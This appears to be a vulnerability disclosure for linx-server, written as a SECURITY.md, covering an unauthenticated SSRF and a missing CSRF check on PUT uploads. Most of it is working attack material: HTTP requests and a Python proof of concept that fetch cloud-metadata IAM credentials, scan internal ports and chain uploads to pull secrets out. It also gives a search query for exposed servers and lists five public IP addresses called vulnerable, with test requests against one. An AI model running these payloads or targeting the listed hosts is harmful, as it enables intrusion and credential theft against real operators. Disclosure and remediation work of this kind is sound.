# Security Policy: Linx-Server SSRF & CSRF Vulnerabilities

## Supported Versions

Affected Versions: v1.0 ~ v2.3.8

## Public Asset Overview

**FOFA Search Syntax:** `body="linx-server" && body="andreimarcu"`
<img width="432" height="284" alt="image" src="https://github.com/user-attachments/assets/b1c93932-35d2-467e-a163-808908a1955b" />

**Total Public Instances:** 180

### Public Proof of Concept

The following IPs have been confirmed to be vulnerable to both vulnerability 1 and vulnerability 2:

| IP Address | Port |
|------------|------|
| 135.181.213.164 | 8080 |
| 91.99.84.186 | 8080 |
| 34.170.142.212 | 8080 |
| 209.141.53.63 | 8080 |
| 75.119.132.202 | 8081 |

---

## Vulnerability 1: Server-Side Request Forgery (SSRF) — CWE-918

**CVSS 3.1 Score:** 9.1 (Critical) — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`

**Prerequisite:** `-remoteuploads` flag enabled (officially recommended in `linx-server.conf.example`)

### Vulnerability Overview

Linx-server does not validate user-supplied URLs when processing remote file uploads. An attacker can exploit this to make arbitrary HTTP requests from the server, enabling internal network service discovery, cloud metadata credential theft, and exfiltration of sensitive information to the public internet.

### White-Box Code Audit

**Vulnerable File:** `upload.go`, lines 161-229

```go
func uploadRemote(c web.C, w http.ResponseWriter, r *http.Request) {
    if Config.remoteAuthFile != "" { // ← Default empty, authentication skipped
        key := r.FormValue("key")
        // ... auth check (SKIPPED when remoteAuthFile is empty)
    }

    upReq := UploadRequest{}
    grabUrl, _ := url.Parse(r.FormValue("url")) // ← User input, no validation
    resp, err := http.Get(grabUrl.String()) // ← Direct server request! No IP filtering!
    // ... Saved to server, publicly accessible
}
```

**Route Registration:** `server.go`, lines 198-205

```go
if Config.remoteUploads {
    mux.Get(Config.sitePath+"upload", uploadRemote)
    mux.Get(Config.sitePath+"upload/", uploadRemote)
}
```

**Official Configuration Recommends Enabling:** `linx-server.conf.example`, line 9: `remoteuploads = true`

### Missing Security Controls

| Security Control | Status |
|----------------|--------|
| Internal IP Filtering | ❌ Does not block 127.0.0.1, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16 |
| Cloud Metadata Blocking | ❌ Does not block 169.254.169.254, metadata.google.internal, 100.100.100.200 |
| Protocol Restriction | ⚠️ Go http.Get limited to http/https only |
| Authentication | ❌ `remoteAuthFile` is empty by default |
| URL Whitelist | ❌ No restrictions on request targets |
| Response Isolation | ❌ SSRF-fetched content saved as public files |

### Attack Chain

```
GET /upload?url=http://169.254.169.254/latest/meta-data/
         ↓
handler() [server.go:198]
         ↓
Config.remoteUploads == true
         ↓
uploadRemote() [upload.go:161]
         ↓
Config.remoteAuthFile == "" ← Authentication skipped
         ↓
url.Parse(r.FormValue("url")) ← User input, no validation
         ↓
http.Get(grabUrl.String()) ← Server requests arbitrary URL
         ↓
No internal IP filter | No cloud metadata block | No URL whitelist
         ↓
processUpload() ← Saved as public file
         ↓
Anyone can access SSRF content via /s/{filename}
```

### Local Testing Steps

**Start the server:**

```bash
./linx-server -bind 127.0.0.1:8080 -filespath files -metapath meta \
-siteurl http://localhost:8080/ -remoteuploads
```

#### Test 1: SSRF → 127.0.0.1

```http
GET /upload?url=http://127.0.0.1:8080/&randomize=yes HTTP/1.1
Host: localhost:8080
User-Agent: curl/8.0.0
Accept: */*
Connection: close
```
<img width="431" height="116" alt="image" src="https://github.com/user-attachments/assets/b7a01299-a5b4-4938-9be5-a81e905a24ec" />

**Response:** `303 See Other` + Location header — Server successfully requested 127.0.0.1:8080. SSRF confirmed.

#### Test 2: SSRF → Internal IP

```http
GET /upload?url=http://172.17.30.94:8080/&randomize=yes HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: */*
Connection: close
```
<img width="431" height="99" alt="image" src="https://github.com/user-attachments/assets/aa08dd88-fec1-4168-847a-f01dfff5837c" />

**Result:** Connects to a local VM IP address. This vulnerability allows detection and exploitation of all IPs + ports in the server's reachable network segment.
<img width="432" height="121" alt="image" src="https://github.com/user-attachments/assets/dab407de-0e79-400f-b063-b8c20caba8d7" />

#### Test 3: SSRF → Sensitive Information Exfiltration via Upload Chain

**Step 3.1: Upload malicious file (dual-package format)**

Request A - Upload sensitive file:

```http
PUT /upload/secret.txt HTTP/1.1
Host: localhost:8080
User-Agent: curl/8.0.0
Content-Type: text/plain
Content-Length: 35
Connection: close

DB_PASSWORD=SuperSecret123!
```

Response A:

```http
HTTP/1.1 200 OK
Content-Security-Policy: default-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; frame-ancestors 'self';
Referrer-Policy: same-origin
X-Frame-Options: SAMEORIGIN
Date: Wed, 06 May 2026 16:37:10 GMT
Content-Type: text/plain; charset=utf-8
Connection: close
Content-Length: 33

http://localhost:8080/secret.txt
```

**Step 3.2: Trigger SSRF to read the file**

Request B - Read the uploaded file:

```http
GET /upload?url=http://127.0.0.1:8080/s/secret.txt&randomize=yes HTTP/1.1
Host: localhost:8080
User-Agent: curl/8.0.0
Accept: */*
Connection: close
```

Response B:

```http
HTTP/1.1 303 See Other
Content-Security-Policy: default-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; frame-ancestors 'self';
Content-Type: text/html; charset=utf-8
Location: /din8azf2.txt
Referrer-Policy: same-origin
X-Frame-Options: SAMEORIGIN
Date: Wed, 06 May 2026 16:39:11 GMT
Connection: close
Content-Length: 39

<a href="/din8azf2.txt">See Other</a>.
```

**Step 3.3: Access the converted temporary file**
<img width="432" height="99" alt="image" src="https://github.com/user-attachments/assets/f7f8b007-5d58-4b7d-8857-e5c238f56d43" />

Extract the path from the Location header in Step 3.2 (e.g., `/din8azf2.txt`):

```http
GET /din8azf2.txt HTTP/1.1
Host: localhost:8080
User-Agent: curl/8.0.0
Accept: */*
Connection: close
```

**Result:** By combining SSRF with the file upload functionality, arbitrary internal HTTP services' content (including other users' private files) can be successfully exfiltrated to the public internet. This technique applies to any internally accessible HTTP service such as GitLab, Jenkins, internal APIs, etc. No authentication is required for any operation.


### Public Instance Validation

#### E1 — SSRF → 127.0.0.1

```http
GET /upload?url=http://127.0.0.1:8080/&randomize=yes HTTP/1.1
Host: 135.181.213.164:8080
```
<img width="432" height="90" alt="image" src="https://github.com/user-attachments/assets/5c46a37e-2e52-4b45-b32e-44dca0d03b8e" />

#### E2 — SSRF → Internal Service Content Exfiltration Complete Chain

```http
PUT /upload/exfil8080secret.txt HTTP/1.1
Host: 135.181.213.164:8080
Content-Type: text/plain

INTERNAL_SECRET=sk-abc123def456
DB_PASSWORD=P@ssw0rd!
API_TOKEN=ghp_xxxxxxxxxxxx
```

```http
GET /upload?url=http://127.0.0.1:8080/s/exfil8080secret.txt&randomize=yes HTTP/1.1
Host: 135.181.213.164:8080
```

```http
GET /m7evy6lp.txt HTTP/1.1
Host: 135.181.213.164:8080
```
<img width="432" height="171" alt="image" src="https://github.com/user-attachments/assets/5256272f-67fc-402a-abfb-60a83c923782" />

**Result:** Sensitive content completely exfiltrated and publicly accessible.

### PoC Code

```python
import requests

# SSRF → 127.0.0.1 (No authentication, no IP filtering)
resp = requests.get("http://TARGET:8080/upload?url=http://127.0.0.1:8080/&randomize=yes",
                    allow_redirects=False)
# Expected: 303 See Other + Location header

# SSRF → Internal service exfiltration chain
requests.put("http://TARGET:8080/upload/secret.txt", data="DB_PASSWORD=SuperSecret123!")
resp = requests.get("http://TARGET:8080/upload?url=http://127.0.0.1:8080/s/secret.txt&randomize=yes",
                    allow_redirects=False)
# Expected: 303 → Location: /xxxxx.txt
content = requests.get(f"http://TARGET:8080{resp.headers['Location']}")
# Expected: DB_PASSWORD=SuperSecret123!

# SSRF → Cloud metadata (AWS IMDSv1 / Alibaba Cloud)
requests.get("http://TARGET:8080/upload?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&randomize=yes",
             allow_redirects=False)

# SSRF → Internal port scan
for port in [22, 80, 443, 3306, 6379, 8080, 9200]:
    resp = requests.get(f"http://TARGET:8080/upload?url=http://192.168.1.5:{port}/&randomize=yes",
                        allow_redirects=False)
    # 303 = port open, 500 = port closed
```

---

## Vulnerability 2: PUT Upload Missing CSRF Protection — CWE-352

**CVSS 3.1 Score:** 7.5 (High) — `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N`

**Prerequisite:** None (exploitable with default configuration)

### White-Box Code Audit

**Vulnerable File:** `upload.go`, lines 126-158

```go
func uploadPutHandler(c web.C, w http.ResponseWriter, r *http.Request) {
    upReq := UploadRequest{}
    uploadHeaderProcess(r, &upReq) // ← No strictReferrerCheck!
    // ...
}
```

**Comparison with POST upload (lines 53-57):**

```go
func uploadPostHandler(c web.C, w http.ResponseWriter, r *http.Request) {
    if !strictReferrerCheck(r, getSiteURL(r), []string{"Linx-Delete-Key", ...}) {
        badRequestHandler(c, w, r, RespAUTO, "") // ← POST has CSRF check
        return
    }
    // ...
}
```

**PUT upload completely bypasses `strictReferrerCheck`.** Any cross-origin website can trigger PUT uploads via JavaScript `fetch()`. This vulnerability does NOT require the `-remoteuploads` flag and works with default configuration.

### Local Testing Steps

**Cross-origin PUT upload (Referer ignored):**

```http
PUT /upload/csrf_test.txt HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Referer: http://evil.example.com/attack
Origin: http://evil.example.com
Content-Type: text/plain
Content-Length: 28
Connection: close

content uploaded via CSRF
```

**Response:** `200 OK` — Cross-origin PUT upload successful.
<img width="431" height="98" alt="image" src="https://github.com/user-attachments/assets/4000fc2d-c716-4ca0-8a2f-6dc2ea48d146" />

**Comparison: POST upload with CSRF check:**

```http
POST /upload HTTP/1.1
Host: 135.181.213.164:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Referer: http://evil.example.com/attack
Origin: http://evil.example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Content-Length: 185
Connection: close

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain

malicious content
------WebKitFormBoundary--
```
<img width="431" height="174" alt="image" src="https://github.com/user-attachments/assets/4d2bc56d-7adf-4538-b786-3e8d374a096b" />

**Result:** POST correctly rejects cross-origin requests.

---

## Responsible Disclosure Note

> **This report is for authorized security testing purposes only.** All public validation only tested SSRF redirect responses (HTTP 303 + Location headers). No actual follow-up requests were made to any internal services or cloud metadata endpoints. No damage was caused to any system.

**Recommendation:** Please fix these vulnerabilities as soon as possible.

---

## Remediation Recommendations

### For SSRF (CWE-918)

1. **Implement URL allowlist/blocklist** — Block internal IP ranges and cloud metadata endpoints
2. **Require authentication** for remote uploads — Do not leave `remoteAuthFile` empty
3. **Add protocol restrictions** — Only allow http/https
4. **Implement response sanitization** — Do not make SSRF responses publicly accessible

### For CSRF (CWE-352)

1. **Apply `strictReferrerCheck` to PUT upload handler** — Match the protection already present in POST upload
2. **Implement CSRF tokens** for state-changing operations
3. **Validate Origin/Referer headers** consistently across all HTTP methods

---

## References

- [CWE-918: Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)
- [CWE-352: Cross-Site Request Forgery (CSRF)](https://cwe.mitre.org/data/definitions/352.html)
- [Linx-Server GitHub Repository](https://github.com/andreimarcu/linx-server)
```

This Markdown document is properly formatted with all code blocks using triple backticks and appropriate language identifiers (```go, ```http, ```bash, ```python). It's ready to be saved as `SECURITY.md` in your GitHub repository.
